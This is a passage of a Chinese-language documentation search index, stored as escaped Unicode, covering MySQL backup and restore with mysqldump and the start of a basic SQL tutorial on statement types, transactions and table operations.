\u5907\u4efd\u4e8c\u8fdb\u5236\u65e5\u5fd7 \u5728\u4f01\u4e1a\u4e2d\uff0c\u4e00\u822c\u7684\u5907\u4efd\u7b56\u7565\u662f\u5b8c\u5168\u5907\u4efd+\u589e\u91cf\u5907\u4efd \u5907\u4efd\u65f6\u95f4\u7684\u9009\u62e9\uff1a\u6570\u636e\u5e93\u8bbf\u95ee\u91cf\u8f83\u5c0f\u7684\u65f6\u5019\u53bb\u5907\u4efd\u3002 \u4e8c\u3001mysqldump \u5907\u4efd 1\u3001\u5355\u5e93\u5907\u4efd [root@mysql ~]# mysqldump -u root -p \u5e93\u540d > /tmp/up1.sql Enter password: 2\u3001\u5355\u8868\u5907\u4efd [root@mysql ~]# mysqldump -uroot -p \u5e93\u540d \u8868\u540d > /tmp/dept.sql Enter password: 3\u3001\u591a\u8868\u5907\u4efd [root@mysql ~]# mysqldump -uroot -p \u5e93\u540d \u8868\u540d \u8868\u540d \u8868\u540d > /tmp/duu.sql Enter password: 4\u3001\u591a\u5e93\u5907\u4efd -B [root@mysql ~]# mysqldump -uroot -p -B \u5e93\u540d \u5e93\u540d > /tmp/utdb.sql Enter password: 5\u3001\u5168\u5e93\u5907\u4efd --all-databases [root@mysql ~]# mysqldump -uroot -p --all-databases > /tmp/all.sql Enter password: \u6062\u590d 1\u3001\u5355\u5e93\u6062\u590d(\u8981\u5148\u521b\u5efa\u6570\u636e\u5e93\u7684) mysql> drop database beh-manager; mysql> create database beh-manager; //\u5148\u5efa\u5e93 \u7b2c\u4e00\u79cd\u6062\u590d\u65b9\u5f0f\uff1a\u5728mysql\u63d0\u793a\u7b26\u4e0b\u8fd0\u884c mysql> use beh-manager mysql> source /tmp/beh-manager.sql \u7b2c\u4e8c\u79cd\u6062\u590d\u65b9\u5f0f\uff1a\u5728shell\u63d0\u793a\u7b26\u4e0b\u6267\u884c mysql> drop database up; mysql> create database up; [root@mysql ~]# mysql -uroot -p up < /tmp/up1.sql Enter password: 2\u3001\u5355\u8868\u6062\u590d mysql> drop table dept; [root@mysql ~]# mysql -uroot -p up < /tmp/dept.sql Enter password: 3\u3001\u591a\u8868\u6062\u590d(\u540c\u5355\u8868\u6062\u590d) [root@mysql ~]# mysql -uroot -p test < /tmp/duu.sql //\u5c06\u8868\u6062\u590d\u5230test\u5e93\u4e2d\u7684\u64cd\u4f5c Enter password: [root@mysql ~]# mysql -uroot -predhat -e \"use test;show tables\" 4\u3001\u591a\u5e93\u6062\u590d (\u4e0d\u9700\u8981\u624b\u52a8\u5efa\u5e93) mysql> drop database up; mysql> drop database test; mysql> source /tmp/utdb.sql 5\u3001\u5168\u5e93\u6062\u590d [root@mysql ~]# mysql -uroot -p < /tmp/all.sql \u200b \u5907\u4efd\u65f6\u5019\u52a0\u9501 -x\uff1a\u7ed9\u6240\u6709\u7684\u8868\u52a0\u8bfb\u9501 -l\uff1a\u7ed9\u5355\u72ec\u7684\u8868\u52a0\u8bfb\u9501 \u67e5\u770bmysqldump\u7684\u5e2e\u52a9 mysqldump --help man mysqldump \u200b \u200b","title":"\u5907\u4efd"},{"location":"database/mysql/bak/#_1","text":"\u5907\u4efd\u662f\u5c06\u7cfb\u7edf\u6216\u8005\u6570\u636e\u5e93\u4e2d\u91cd\u8981\u662f\u6570\u636e\u4fdd\u5b58\u8d77\u6765\uff0c\u76ee\u7684\u662f\u4e3a\u4e86\u4fdd\u8bc1\u5728\u707e\u96be\u6216\u6545\u969c\u53d1\u751f\u7684\u65f6\u5019\uff0c\u786e\u4fdd\u6570\u636e\u4e0d\u4e22\u5931\u6216\u8005\u662f\u6700\u5c0f\u7a0b\u5ea6\u7684\u4e22\u5931 \u5907\u4efd\u7b56\u7565\u8981\u6c42\uff1a \u7b2c\u4e09\u65b9\u5907\u4efd\u8f6f\u4ef6 bacula (\u5f00\u6e90\u5907\u4efd\u8f6f\u4ef6)\u7b49","title":"\u5907\u4efd\u4e0e\u6062\u590d"},{"location":"database/mysql/bak/#_2","text":"","title":"\u4e00\u3001\u5907\u4efd\u7684\u5206\u7c7b"},{"location":"database/mysql/bak/#1","text":"","title":"1\u3001\u6839\u636e\u5907\u4efd\u65b9\u6cd5\u5206"},{"location":"database/mysql/bak/#1cold-backup","text":"\u4e5f\u53eb\u79bb\u7ebf\u5907\u4efd(offline backup) \u8fd9\u79cd\u5907\u4efd\u6700\u7b80\u5355\uff0c\u76f4\u63a5\u62f7\u8d1d\u7269\u7406\u6587\u4ef6 \u9700\u8981\u5173\u95ed\u6570\u636e\u5e93\uff0c\u7136\u540e\u624d\u80fd\u8fdb\u884c\u5907\u4efd","title":"1\uff09\u51b7\u5907\u4efd(cold backup)"},{"location":"database/mysql/bak/#2hot-backup","text":"\u4e5f\u53eb\u5728\u7ebf\u5907\u4efd(online backup) \u65e0\u9700\u5173\u95ed\u6570\u636e\u5e93\uff0c\u76f4\u63a5\u5728\u7ebf\u5907\u4efd","title":"2\uff09\u70ed\u5907\u4efd(hot backup)"},{"location":"database/mysql/bak/#3warm-backup","text":"\u65e0\u9700\u5173\u95ed\u6570\u636e\u5e93\uff0c\u4f46\u662f\u4f1a\u5bf9\u5f53\u524d\u6570\u636e\u5e93\u7684\u64cd\u4f5c\u6709\u5f71\u54cd\uff0c\u56e0\u4e3a\u4f1a\u7ed9\u6570\u636e\u5e93\u52a0\u5168\u5c40\u8bfb\u9501","title":"3\uff09\u6e29\u5907\uff08warm backup\uff09"},{"location":"database/mysql/bak/#2","text":"","title":"2\u3001\u6839\u636e\u5907\u4efd\u540e\u7684\u6587\u4ef6\u5206"},{"location":"database/mysql/bak/#_3","text":"\u6307\u5907\u4efd\u51fa\u6765\u7684\u6587\u4ef6\u662f\u53ef\u8bfb\u7684\uff0c\u4e5f\u5c31\u662f\u6587\u672c\u6587\u4ef6 \u5982\uff1amysqldump","title":"\u903b\u8f91\u5907\u4efd"},{"location":"database/mysql/bak/#_4","text":"\u6307\u5907\u4efd\u6570\u636e\u5e93\u7684\u7269\u7406\u6587\u4ef6 \u5982\uff1aibbackup","title":"\u7269\u7406\u5907\u4efd"},{"location":"database/mysql/bak/#3","text":"","title":"3\u3001\u6309\u7167\u5907\u4efd\u6570\u636e\u5e93\u7684\u5185\u5bb9\u6765\u5206"},{"location":"database/mysql/bak/#_5","text":"\u4e0d\u7ba1\u662f\u5426\u53d1\u751f\u53d8\u5316\uff0c\u5c06\u5168\u5e93\u90fd\u5907\u4efd","title":"\u5b8c\u5168\u5907\u4efd\uff1a"},{"location":"database/mysql/bak/#_6","text":"\u4ec5\u5907\u4efd\u4e0a\u6b21\u5907\u4efd\u5230\u8fd9\u6b21\u5907\u4efd\u4e4b\u95f4\u53d1\u751f\u53d8\u5316\u7684\u90e8\u5206","title":"\u589e\u91cf\u5907\u4efd\uff1a"},{"location":"database/mysql/bak/#_7","text":"\u5907\u4efd\u4e8c\u8fdb\u5236\u65e5\u5fd7 \u5728\u4f01\u4e1a\u4e2d\uff0c\u4e00\u822c\u7684\u5907\u4efd\u7b56\u7565\u662f\u5b8c\u5168\u5907\u4efd+\u589e\u91cf\u5907\u4efd \u5907\u4efd\u65f6\u95f4\u7684\u9009\u62e9\uff1a\u6570\u636e\u5e93\u8bbf\u95ee\u91cf\u8f83\u5c0f\u7684\u65f6\u5019\u53bb\u5907\u4efd\u3002","title":"\u65e5\u5fd7\u5907\u4efd\uff1a"},{"location":"database/mysql/bak/#mysqldump","text":"","title":"\u4e8c\u3001mysqldump"},{"location":"database/mysql/bak/#_8","text":"","title":"\u5907\u4efd"},{"location":"database/mysql/bak/#1_1","text":"[root@mysql ~]# mysqldump -u root -p \u5e93\u540d > /tmp/up1.sql Enter password:","title":"1\u3001\u5355\u5e93\u5907\u4efd"},{"location":"database/mysql/bak/#2_1","text":"[root@mysql ~]# mysqldump -uroot -p \u5e93\u540d \u8868\u540d > /tmp/dept.sql Enter password:","title":"2\u3001\u5355\u8868\u5907\u4efd"},{"location":"database/mysql/bak/#3_1","text":"[root@mysql ~]# mysqldump -uroot -p \u5e93\u540d \u8868\u540d \u8868\u540d \u8868\u540d > /tmp/duu.sql Enter password:","title":"3\u3001\u591a\u8868\u5907\u4efd"},{"location":"database/mysql/bak/#4-b","text":"[root@mysql ~]# mysqldump -uroot -p -B \u5e93\u540d \u5e93\u540d > /tmp/utdb.sql Enter password:","title":"4\u3001\u591a\u5e93\u5907\u4efd    -B"},{"location":"database/mysql/bak/#5-all-databases","text":"[root@mysql ~]# mysqldump -uroot -p --all-databases > /tmp/all.sql Enter password:","title":"5\u3001\u5168\u5e93\u5907\u4efd    --all-databases"},{"location":"database/mysql/bak/#_9","text":"","title":"\u6062\u590d"},{"location":"database/mysql/bak/#1_2","text":"mysql> drop database beh-manager; mysql> create database beh-manager; //\u5148\u5efa\u5e93 \u7b2c\u4e00\u79cd\u6062\u590d\u65b9\u5f0f\uff1a\u5728mysql\u63d0\u793a\u7b26\u4e0b\u8fd0\u884c mysql> use beh-manager mysql> source /tmp/beh-manager.sql \u7b2c\u4e8c\u79cd\u6062\u590d\u65b9\u5f0f\uff1a\u5728shell\u63d0\u793a\u7b26\u4e0b\u6267\u884c mysql> drop database up; mysql> create database up; [root@mysql ~]# mysql -uroot -p up < /tmp/up1.sql Enter password:","title":"1\u3001\u5355\u5e93\u6062\u590d(\u8981\u5148\u521b\u5efa\u6570\u636e\u5e93\u7684)"},{"location":"database/mysql/bak/#2_2","text":"mysql> drop table dept; [root@mysql ~]# mysql -uroot -p up < /tmp/dept.sql Enter password:","title":"2\u3001\u5355\u8868\u6062\u590d"},{"location":"database/mysql/bak/#3_2","text":"[root@mysql ~]# mysql -uroot -p test < /tmp/duu.sql //\u5c06\u8868\u6062\u590d\u5230test\u5e93\u4e2d\u7684\u64cd\u4f5c Enter password: [root@mysql ~]# mysql -uroot -predhat -e \"use test;show tables\"","title":"3\u3001\u591a\u8868\u6062\u590d(\u540c\u5355\u8868\u6062\u590d)"},{"location":"database/mysql/bak/#4","text":"mysql> drop database up; mysql> drop database test; mysql> source /tmp/utdb.sql","title":"4\u3001\u591a\u5e93\u6062\u590d  (\u4e0d\u9700\u8981\u624b\u52a8\u5efa\u5e93)"},{"location":"database/mysql/bak/#5","text":"[root@mysql ~]# mysql -uroot -p < /tmp/all.sql \u200b \u5907\u4efd\u65f6\u5019\u52a0\u9501 -x\uff1a\u7ed9\u6240\u6709\u7684\u8868\u52a0\u8bfb\u9501 -l\uff1a\u7ed9\u5355\u72ec\u7684\u8868\u52a0\u8bfb\u9501 \u67e5\u770bmysqldump\u7684\u5e2e\u52a9 mysqldump --help man mysqldump \u200b \u200b","title":"5\u3001\u5168\u5e93\u6062\u590d"},{"location":"database/mysql/basic/","text":"SQL (Structured Query Language) \u7ed3\u6784\u5316\u67e5\u8be2\u8bed\u8a00 \u4e13\u95e8\u7528\u6765\u548c\u5173\u7cfb\u578b\u6570\u636e\u5e93\u8fdb\u884c\u901a\u4fe1\u7684\u8bed\u8a00 SQL\u8bed\u53e5\u4e2d\u7684\u5927\u5c0f\u5199\u95ee\u9898\uff1a 1\uff09\u5173\u952e\u5b57\u3001\u51fd\u6570\u540d\u3001\u5217\u540d\u548c\u7d22\u5f15\u540d\u4e0d\u533a\u5206\u5927\u5c0f\u5199 2\uff09\u6570\u636e\u5e93\u540d\u3001\u8868\u540d\u3001\u522b\u540d\u53ca\u89c6\u56fe\u540d\u533a\u5206\u5927\u5c0f\u5199\u7684(\u56e0\u4e3alinux\u7cfb\u7edf\u662f\u533a\u5206\u5927\u5c0f\u5199\u7684) 3\uff09\u5b58\u50a8\u8fc7\u7a0b\u3001\u4e8b\u4ef6\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff0c\u89e6\u53d1\u5668\u533a\u5206\u5927\u5c0f\u5199\u3002 SQL\u8bed\u53e5\u7684\u5206\u7c7b 1. \u6570\u636e\u67e5\u8be2\u8bed\u8a00DQL \u6570\u636e\u67e5\u8be2\u8bed\u8a00DQL\u57fa\u672c\u7ed3\u6784\u662f\u7531SELECT\u5b50\u53e5\uff0cFROM\u5b50\u53e5\uff0cWHERE\uff0c\u5b50\u53e5\u7ec4\u6210\u7684\u67e5\u8be2\u5757\uff1a SELECT <\u5b57\u6bb5\u540d\u8868> FROM <\u8868\u6216\u89c6\u56fe\u540d> WHERE <\u67e5\u8be2\u6761\u4ef6> 2 .\u6570\u636e\u64cd\u7eb5\u8bed\u8a00DML \u6570\u636e\u64cd\u7eb5\u8bed\u8a00DML\u4e3b\u8981\u6709\u4e09\u79cd\u5f62\u5f0f\uff1a 1) \u63d2\u5165\uff1aINSERT 2) \u66f4\u65b0\uff1aUPDATE 3) \u5220\u9664\uff1aDELETE 3. \u6570\u636e\u5b9a\u4e49\u8bed\u8a00DDL \u6570\u636e\u5b9a\u4e49\u8bed\u8a00DDL\u7528\u6765\u521b\u5efa\u6570\u636e\u5e93\u4e2d\u7684\u5404\u79cd\u5bf9\u8c61-----\u8868\u3001\u89c6\u56fe\u3001\u7d22\u5f15\u3001\u540c\u4e49\u8bcd\u3001\u805a\u7c07\u7b49\u5982\uff1a create TABLE/VIEW/INDEX/SYN/CLUSTER \u521b\u5efa alter \u4fee\u6539 drop \u5220\u9664 truncate \u622a\u65ad DDL\u64cd\u4f5c\u662f\u9690\u6027\u63d0\u4ea4\u7684\uff01\u4e0d\u80fdrollback 4. \u6570\u636e\u63a7\u5236\u8bed\u8a00DCL \u6570\u636e\u63a7\u5236\u8bed\u8a00DCL\u7528\u6765\u6388\u4e88\u6216\u56de\u6536\u8bbf\u95ee\u6570\u636e\u5e93\u7684\u67d0\u79cd\u7279\u6743\uff0c\u5e76\u63a7\u5236\u6570\u636e\u5e93\u64cd\u7eb5\u4e8b\u52a1\u53d1\u751f\u7684\u65f6\u95f4\u53ca\u6548\u679c\uff0c\u5bf9\u6570\u636e\u5e93\u5b9e\u884c\u76d1\u89c6\u7b49\u3002\u5982\uff1a 1) grant\uff1a \u6388\u6743\u3002 revoke \u56de\u6536\u6743\u9650 2) ROLLBACK [WORK] TO [SAVEPOINT]\uff1a\u56de\u9000\u5230\u67d0\u4e00\u70b9\u3002 \u56de\u6eda---ROLLBACK \u56de\u6eda\u547d\u4ee4\u4f7f\u6570\u636e\u5e93\u72b6\u6001\u56de\u5230\u4e0a\u6b21\u6700\u540e\u63d0\u4ea4\u7684\u72b6\u6001\u3002\u5176\u683c\u5f0f\u4e3a\uff1a SQL>ROLLBACK; 3) COMMIT [WORK]\uff1a\u63d0\u4ea4\u3002 \u5728\u6570\u636e\u5e93\u7684\u63d2\u5165\u3001\u5220\u9664\u548c\u4fee\u6539\u64cd\u4f5c\u65f6\uff0c\u53ea\u6709\u5f53\u4e8b\u52a1\u5728\u63d0\u4ea4\u5230\u6570\u636e\u5e93\u65f6\u624d\u7b97\u5b8c\u6210\u3002\u5728\u4e8b\u52a1\u63d0\u4ea4\u524d\uff0c\u53ea\u6709\u64cd\u4f5c\u6570\u636e\u5e93\u7684\u8fd9\u4e2a\u4eba\u624d\u80fd\u6709\u6743\u770b\u5230\u6240\u505a\u7684\u4e8b\u60c5\uff0c\u522b\u4eba\u53ea\u6709\u5728\u6700\u540e\u63d0\u4ea4\u5b8c\u6210\u540e\u624d\u53ef\u4ee5\u770b\u5230\u3002\u63d0\u4ea4\u6570\u636e\u6709\u4e09\u79cd\u7c7b\u578b\uff1a\u663e\u5f0f\u63d0\u4ea4\u3001\u9690\u5f0f\u63d0\u4ea4\u53ca\u81ea\u52a8\u63d0\u4ea4\u3002\u4e0b\u9762\u5206\u522b\u8bf4\u660e\u8fd9\u4e09\u79cd\u7c7b\u578b\u3002 (1) \u663e\u5f0f\u63d0\u4ea4 \u7528COMMIT\u547d\u4ee4\u76f4\u63a5\u5b8c\u6210\u7684\u63d0\u4ea4\u4e3a\u663e\u5f0f\u63d0\u4ea4\u3002\u5176\u683c\u5f0f\u4e3a\uff1a SQL>COMMIT\uff1b (2) \u9690\u5f0f\u63d0\u4ea4 \u7528SQL\u547d\u4ee4\u95f4\u63a5\u5b8c\u6210\u7684\u63d0\u4ea4\u4e3a\u9690\u5f0f\u63d0\u4ea4\u3002\u8fd9\u4e9b\u547d\u4ee4\u662f\uff1a ALTER\uff0cAUDIT\uff0cCOMMENT\uff0cCONNECT\uff0cCREATE\uff0cDISCONNECT\uff0cDROP\uff0c EXIT\uff0cGRANT\uff0cNOAUDIT\uff0cQUIT\uff0cREVOKE\uff0cRENAME\u3002 (3) \u81ea\u52a8\u63d0\u4ea4 \u82e5\u628aAUTOCOMMIT\u8bbe\u7f6e\u4e3aON\uff0c\u5219\u5728\u63d2\u5165\u3001\u4fee\u6539\u3001\u5220\u9664\u8bed\u53e5\u6267\u884c\u540e\uff0c\u7cfb\u7edf\u5c06\u81ea\u52a8\u8fdb\u884c\u63d0\u4ea4\uff0c\u8fd9\u5c31\u662f\u81ea\u52a8\u63d0\u4ea4\u3002\u5176\u683c\u5f0f\u4e3a\uff1a SQL>SET AUTOCOMMIT ON\uff1b MySQL \u4e8b\u52a1 MySQL \u4e8b\u52a1\u4e3b\u8981\u7528\u4e8e\u5904\u7406\u64cd\u4f5c\u91cf\u5927\uff0c\u590d\u6742\u5ea6\u9ad8\u7684\u6570\u636e\u3002\u6bd4\u5982\u8bf4\uff0c\u5728\u4eba\u5458\u7ba1\u7406\u7cfb\u7edf\u4e2d\uff0c\u4f60\u5220\u9664\u4e00\u4e2a\u4eba\u5458\uff0c\u4f60\u65e2\u9700\u8981\u5220\u9664\u4eba\u5458\u7684\u57fa\u672c\u8d44\u6599\uff0c\u4e5f\u8981\u5220\u9664\u548c\u8be5\u4eba\u5458\u76f8\u5173\u7684\u4fe1\u606f\uff0c\u5982\u4fe1\u7bb1\uff0c\u6587\u7ae0\u7b49\u7b49\uff0c\u8fd9\u6837\uff0c\u8fd9\u4e9b\u6570\u636e\u5e93\u64cd\u4f5c\u8bed\u53e5\u5c31\u6784\u6210\u4e00\u4e2a\u4e8b\u52a1\uff01 \u5728 MySQL \u4e2d\u53ea\u6709\u4f7f\u7528\u4e86 Innodb \u6570\u636e\u5e93\u5f15\u64ce\u7684\u6570\u636e\u5e93\u6216\u8868\u624d\u652f\u6301\u4e8b\u52a1\u3002 \u4e8b\u52a1\u5904\u7406\u53ef\u4ee5\u7528\u6765\u7ef4\u62a4\u6570\u636e\u5e93\u7684\u5b8c\u6574\u6027\uff0c\u4fdd\u8bc1\u6210\u6279\u7684 SQL \u8bed\u53e5\u8981\u4e48\u5168\u90e8\u6267\u884c\uff0c\u8981\u4e48\u5168\u90e8\u4e0d\u6267\u884c\u3002 \u4e8b\u52a1\u7528\u6765\u7ba1\u7406 insert,update,delete \u8bed\u53e5 \u4e00\u822c\u6765\u8bf4\uff0c\u4e8b\u52a1\u662f\u5fc5\u987b\u6ee1\u8db34\u4e2a\u6761\u4ef6\uff08ACID\uff09\uff1a \u539f\u5b50\u6027\uff08Atomicity\uff0c\u6216\u79f0\u4e0d\u53ef\u5206\u5272\u6027\uff09\u3001\u4e00\u81f4\u6027\uff08Consistency\uff09\u3001\u9694\u79bb\u6027\uff08Isolation\uff0c\u53c8\u79f0\u72ec\u7acb\u6027\uff09\u3001\u6301\u4e45\u6027\uff08Durability\uff09\u3002 \u539f\u5b50\u6027\uff1a\u4e00\u4e2a\u4e8b\u52a1\uff08transaction\uff09\u4e2d\u7684\u6240\u6709\u64cd\u4f5c\uff0c\u8981\u4e48\u5168\u90e8\u5b8c\u6210\uff0c\u8981\u4e48\u5168\u90e8\u4e0d\u5b8c\u6210\uff0c\u4e0d\u4f1a\u7ed3\u675f\u5728\u4e2d\u95f4\u67d0\u4e2a\u73af\u8282\u3002\u4e8b\u52a1\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u53d1\u751f\u9519\u8bef\uff0c\u4f1a\u88ab\u56de\u6eda\uff08Rollback\uff09\u5230\u4e8b\u52a1\u5f00\u59cb\u524d\u7684\u72b6\u6001\uff0c\u5c31\u50cf\u8fd9\u4e2a\u4e8b\u52a1\u4ece\u6765\u6ca1\u6709\u6267\u884c\u8fc7\u4e00\u6837\u3002 \u4e00\u81f4\u6027\uff1a\u5728\u4e8b\u52a1\u5f00\u59cb\u4e4b\u524d\u548c\u4e8b\u52a1\u7ed3\u675f\u4ee5\u540e\uff0c\u6570\u636e\u5e93\u7684\u5b8c\u6574\u6027\u6ca1\u6709\u88ab\u7834\u574f\u3002\u8fd9\u8868\u793a\u5199\u5165\u7684\u8d44\u6599\u5fc5\u987b\u5b8c\u5168\u7b26\u5408\u6240\u6709\u7684\u9884\u8bbe\u89c4\u5219\uff0c\u8fd9\u5305\u542b\u8d44\u6599\u7684\u7cbe\u786e\u5ea6\u3001\u4e32\u8054\u6027\u4ee5\u53ca\u540e\u7eed\u6570\u636e\u5e93\u53ef\u4ee5\u81ea\u53d1\u6027\u5730\u5b8c\u6210\u9884\u5b9a\u7684\u5de5\u4f5c\u3002 \u9694\u79bb\u6027\uff1a\u6570\u636e\u5e93\u5141\u8bb8\u591a\u4e2a\u5e76\u53d1\u4e8b\u52a1\u540c\u65f6\u5bf9\u5176\u6570\u636e\u8fdb\u884c\u8bfb\u5199\u548c\u4fee\u6539\u7684\u80fd\u529b\uff0c\u9694\u79bb\u6027\u53ef\u4ee5\u9632\u6b62\u591a\u4e2a\u4e8b\u52a1\u5e76\u53d1\u6267\u884c\u65f6\u7531\u4e8e\u4ea4\u53c9\u6267\u884c\u800c\u5bfc\u81f4\u6570\u636e\u7684\u4e0d\u4e00\u81f4\u3002\u4e8b\u52a1\u9694\u79bb\u5206\u4e3a\u4e0d\u540c\u7ea7\u522b\uff0c\u5305\u62ec\u8bfb\u672a\u63d0\u4ea4\uff08Read uncommitted\uff09\u3001\u8bfb\u63d0\u4ea4\uff08read committed\uff09\u3001\u53ef\u91cd\u590d\u8bfb\uff08repeatable read\uff09\u548c\u4e32\u884c\u5316\uff08Serializable\uff09\u3002 \u6301\u4e45\u6027\uff1a\u4e8b\u52a1\u5904\u7406\u7ed3\u675f\u540e\uff0c\u5bf9\u6570\u636e\u7684\u4fee\u6539\u5c31\u662f\u6c38\u4e45\u7684\uff0c\u5373\u4fbf\u7cfb\u7edf\u6545\u969c\u4e5f\u4e0d\u4f1a\u4e22\u5931\u3002 \u5728 MySQL \u547d\u4ee4\u884c\u7684\u9ed8\u8ba4\u8bbe\u7f6e\u4e0b\uff0c\u4e8b\u52a1\u90fd\u662f\u81ea\u52a8\u63d0\u4ea4\u7684\uff0c\u5373\u6267\u884c SQL \u8bed\u53e5\u540e\u5c31\u4f1a\u9a6c\u4e0a\u6267\u884c COMMIT \u64cd\u4f5c\u3002\u56e0\u6b64\u8981\u663e\u5f0f\u5730\u5f00\u542f\u4e00\u4e2a\u4e8b\u52a1\u52a1\u987b\u4f7f\u7528\u547d\u4ee4 BEGIN \u6216 START TRANSACTION\uff0c\u6216\u8005\u6267\u884c\u547d\u4ee4 SET AUTOCOMMIT=0\uff0c\u7528\u6765\u7981\u6b62\u4f7f\u7528\u5f53\u524d\u4f1a\u8bdd\u7684\u81ea\u52a8\u63d0\u4ea4\u3002 \u57fa\u672cSQL\u8bed\u53e5 1\u3001\u67e5\u770b\u5f53\u524d\u7528\u6237 [root@mysql mysql]# mysql -u root -p123456 mysql> select user(); +----------------+ | user() | +----------------+ | root@localhost | +----------------+ 1 row in set (0.00 sec) 2\u3001\u5bf9\u6570\u636e\u5e93\u7684\u64cd\u4f5c 1\uff09\u67e5\u770b\u5f53\u524d\u64cd\u4f5c\u7684\u6570\u636e\u5e93 mysql> select database(); +------------+ | database() | +------------+ | NULL | +------------+ 1 row in set (0.00 sec) 2\uff09\u9009\u62e9\u64cd\u4f5c\u54ea\u4e2a\u6570\u636e\u5e93 mysql> use test Database changed 3\uff09\u67e5\u770b\u7cfb\u7edf\u4e2d\u6709\u54ea\u4e9b\u6570\u636e\u5e93 mysql> show databases; +--------------------+ | Database | +--------------------+ | information_schema | \u4fe1\u606f\u6a21\u5f0f\u6570\u636e\u5e93\uff0c\u4fdd\u5b58\u670d\u52a1\u5668\u7684\u4fe1\u606f | mysql | \u6838\u5fc3\u7ba1\u7406\u6570\u636e\u5e93\uff0c\u4fdd\u5b58\u4e86\u7528\u6237\u548c\u6743\u9650\u4fe1\u606f\uff0c\u8bb0\u5f55\u4e86\u548c\u7cfb\u7edf\u5b89\u5168\u76f8\u5173\u7684\u4fe1\u606f | performance_schema | \u6027\u80fd\u6a21\u5f0f\u6570\u636e\u5e93\uff0c\u641c\u7d22\u670d\u52a1\u5668\u7684\u6027\u80fd\u53c2\u6570 | test | \u6d4b\u8bd5\u6570\u636e\u5e93 +--------------------+ 4 rows in set (0.02 sec) 4\uff09\u67e5\u770b\u5f53\u524d\u6570\u636e\u5e93\u4e0b\u6709\u54ea\u4e9b\u8868 mysql> show tables; Empty set (0.02 sec) 5\uff09\u521b\u5efa\u6570\u636e\u5e93 mysql> create database updb1; Query OK, 1 row affected (0.01 sec) \u6ce8\u610f\uff1a\u5728\u540c\u4e00\u4e2a\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u4e2d\u6570\u636e\u5e93\u540d\u4e0d\u80fd\u91cd\u590d 6\uff09\u5220\u9664\u6570\u636e\u5e93 (\u8f7b\u6613\u522b\u8fd9\u4e48\u505a\uff0c\u98ce\u9669\u5927) mysql> drop database updb1; Query OK, 0 rows affected (0.04 sec) 3\u3001\u5bf9\u8868\u7684\u64cd\u4f5c \u6ce8\u610f\uff1a 1\uff09\u8868\u4e00\u5b9a\u8981\u5b58\u5728\u6570\u636e\u5e93\u4e2d 2\uff09\u5728\u540c\u4e00\u4e2a\u6570\u636e\u5e93\u4e2d\uff0c\u8868\u540d\u4e0d\u80fd\u91cd\u590d 1\uff09\u521b\u5efa\u8868(\u521b\u5efa\u7684\u662f\u8868\u7ed3\u6784) \u8bed\u6cd5\uff1acreate table \u8868\u540d (\u5b57\u6bb51\u540d \u5b57\u6bb5\u7c7b\u578b,\u5b57\u6bb52\u540d \u5b57\u6bb5\u7c7b\u578b,... ...,\u5b57\u6bb5n\u540d \u5b57\u6bb5\u7c7b\u578b); mysql> use test; Database changed mysql> create table t1 (id int,name char(10)); Query OK, 0 rows affected (0.05 sec) 2\uff09\u67e5\u770b\u8868\u7ed3\u6784 mysql> desc t1; +-------+----------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+----------+------+-----+---------+-------+ | id | int(11) | YES | | NULL | | | name | char(10) | YES | | NULL | | +-------+----------+------+-----+---------+-------+ 2 rows in set (0.00 sec) Field\uff1a\u5b57\u6bb5\u540d\u5b57 Type\uff1a\u5b57\u6bb5\u7c7b\u578b Null\uff1a\u662f\u5426\u5141\u8bb8\u4e3a\u7a7a Key\uff1a\u952e\u503c(\u4e3b\u952e\u7b49) Default\uff1a\u9ed8\u8ba4\u503c Extra\uff1a\u5176\u4ed6(\u81ea\u589e\u7b49) 3\uff09\u67e5\u770b\u5efa\u8868\u65f6\u4f7f\u7528\u7684\u8bed\u53e5 mysql> show create table t1\\G ******** 1. row ********* Table: t1 Create Table: CREATE TABLE t1 ( id int(11) DEFAULT NULL, name char(10) DEFAULT NULL ) ENGINE=InnoDB DEFAULT CHARSET=utf8 1 row in set (0.00 sec) mysql> show create table mysql.user\\G mysql.user\uff1a\u5e93\u540d.\u8868\u540d 4\uff09\u5411\u8868\u4e2d\u63d2\u5165\u6570\u636e a\u3001\u63d2\u5165\u6570\u636e\u65f6\uff0c\u4e0d\u6307\u5b9a\u5b57\u6bb5\uff0c\u5728\u5199\u503c\u7684\u65f6\u5019\u987a\u5e8f\u8981\u4e0e\u8868\u4e2d\u7684\u5b57\u6bb5\u7684\u987a\u5e8f\u4e00\u4e00\u5bf9\u5e94\uff0c\u503c\u7684\u6570\u91cf\u8981\u548c\u5b57\u6bb5\u6570\u4e00\u6837\u591a \u8bed\u6cd5\uff1ainsert into \u8868\u540d values \uff08\u503c1,\u503c2,......,\u503cn\uff09; mysql> insert into t1 values(1,'Tom'); Query OK, 1 row affected (0.00 sec) b\u3001\u63d2\u5165\u65f6\u6307\u5b9a\u5b57\u6bb5 \u8bed\u6cd5\uff1ainsert into \u8868\u540d(\u5b57\u6bb5\u540d1,\u5b57\u6bb5\u540d2,... ...,\u5b57\u6bb5\u540dn) values \uff08\u503c1,\u503c2,......,\u503cn\uff09; mysql> insert into t1(id) values(250); mysql> insert into t1(name,id) values('Mary',3); mysql> select * from t1; //\u67e5\u8be2t1\u8868\u4e2d\u7684\u6570\u636e +------+------+ | id | name | +------+------+ | 1 | Tom | | 250 | NULL | | 3 | Mary | +------+------+ 3 rows in set (0.00 sec) c\u3001\u5411\u8868\u4e2d\u63d2\u5165\u591a\u6761\u6570\u636e mysql> insert into t1 values(4,'jack'),(5,'Kite'),(7,'LiLei'); //\u540c\u65f6\u5411t1\u8868\u4e2d\u63d2\u5165\u4e09\u6761\u8bb0\u5f55 5\uff09\u67e5\u8be2\u8868\u4e2d\u6570\u636e mysql> select * from t1; //\u5168\u8868\u67e5\u8be2 mysql> select name from t1; //\u6307\u5b9a\u5b57\u6bb5\u67e5\u8be2 select \u540e\u9762\u63a5\u5b57\u6bb5\u540d\u5b57 mysql> select name,id from t1; //\u67e5\u8be2\u591a\u4e2a\u5b57\u6bb5 6\uff09\u4fee\u6539\u8868\u7ed3\u6784 alter a\u3001\u589e\u52a0\u5b57\u6bb5 \uff081\uff09\u5411\u8868\u4e2d\u589e\u52a0\u5b57\u6bb5(\u9ed8\u8ba4\u6dfb\u52a0\u5230\u6700\u540e\u4e00\u4e2a\u5b57\u6bb5) \u8bed\u6cd5\uff1aalter table \u8868\u540d add 